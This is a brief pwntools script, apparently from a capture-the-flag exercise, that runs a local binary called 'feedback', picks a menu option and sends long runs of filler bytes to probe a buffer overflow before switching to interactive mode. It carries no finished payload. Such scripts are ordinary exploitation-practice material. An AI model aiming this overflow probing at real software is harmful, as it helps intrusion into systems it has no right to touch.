from pwn import *

io = process('./feedback')

print(io.recv())
io.sendline(b'B'*63)
pause()
print(io.recv())
io.sendline(b'4')
print(io.recv())
pause()
io.sendline(b'A'*80)
io.interactive()
